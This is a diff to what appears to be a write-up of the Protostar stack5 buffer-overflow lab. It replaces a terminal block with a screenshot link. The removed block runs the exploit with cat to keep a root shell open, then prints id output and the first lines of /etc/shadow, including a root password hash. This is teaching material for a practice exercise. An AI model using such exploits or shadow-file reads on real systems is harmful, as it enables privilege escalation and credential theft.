@@ -224,17 +224,4 @@ user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
 ```
 because `STDIN` of the spawned `/bin/sh` is connected to `STDOUT` of python stack5.py command ... and as that process is killed, the child process dies too . we can use cat here, to get a reverse shell ...
 
-```bash
-user@protostar:/tmp$ (python stack5.py;cat) | /opt/protostar/bin/stack5
-id
-uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
-whoami
-root
-head -n 5 /etc/shadow
-root:$6$gOA4/iAf$EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.riaGhLmESwWwB7Rnntu5JCDnRnOUTeeYWQk.iUq0:15302:0:99999:7:::
-daemon:*:15300:0:99999:7:::
-bin:*:15300:0:99999:7:::
-sys:*:15300:0:99999:7:::
-sync:*:15300:0:99999:7:::
-...
-```
+![assets/stack5.png](assets/stack5.png)
